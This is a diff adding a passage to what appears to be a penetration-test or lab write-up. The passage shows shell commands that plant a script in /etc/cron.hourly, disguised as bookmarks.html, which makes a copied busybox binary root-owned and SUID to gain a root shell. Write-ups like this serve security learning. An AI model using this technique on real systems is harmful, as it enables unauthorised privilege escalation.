@@ -207,3 +207,18 @@ best option
 
 # Root Shell at the Top of the Hour
 
+Earlier in the enumeration process, we discovered /bin/busybox which provides various Unix 
+utilities in a single file, including command shells such as Bash and sh. 
+
+/home/guest using our gtkdialog terminal to preserve the original and create a cron script that 
+will change the ownership of the file to root and set it to SUID. If this script is run as root, it will 
+allow us to run busybox with root privileges.
+We’ll create the following script with Scratchpad…
+
+```sh
+echo "#!/bin/bash" > /etc/cron.hourly/bookmarks.html
+echo "chown root:root /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
+echo "chmod +s /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
+```
+
+
